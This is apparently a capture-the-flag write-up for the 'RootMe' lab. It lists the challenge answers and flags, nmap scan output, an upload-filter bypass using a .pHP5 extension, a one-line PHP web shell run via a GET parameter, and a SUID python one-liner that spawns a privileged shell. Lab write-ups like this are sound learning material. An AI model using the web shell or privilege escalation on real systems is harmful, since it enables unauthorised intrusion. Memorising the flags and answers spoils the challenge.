# RootMe
##### Question 1: Scan the machine, how many ports are open?
Answer
```bash
2
```

##### Question 2: What version of Apache is running?
Answer
```bash
2.4.29
```

##### Question 3: What service is running on port 22?
Answer
```bash
ssh
```

##### Question 4: What is the hidden directory?
Answer
```bash
/panel/
```

##### Question 5: user.txt
Answer
```bash
THM{y0u_g0t_a_sh3ll}
```

##### Question 6: Search for files with SUID permission, which file is weird?
Answer
```bash
/usr/bin/python
```

##### Question 7: root.txt
Answer
```bash
THM{pr1v1l3g3_3sc4l4t10n}
```

- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Nmap Scan:
```bash

Nmap scan report for 10.10.92.103
Host is up (0.10s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4a:b9:16:08:84:c2:54:48:ba:5c:fd:3f:22:5f:22:14 (RSA)
|   256 a9:a6:86:e8:ec:96:c3:f0:03:cd:16:d5:49:73:d0:82 (ECDSA)
|_  256 22:f6:b5:a6:54:d9:78:7c:26:03:5a:95:f3:f9:df:cd (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: HackIT - Home
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:


```

Command Execution
```bash

upload file to /panel and the upload dir is /upload

it doesnt like .php so make it .pHP5

php shell - <?=`$_GET[0]`?>

call it at /uploads/shell.php?0=id
```

ssh creds: test:test 

```bash
priv esc (From SUID privesc)
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```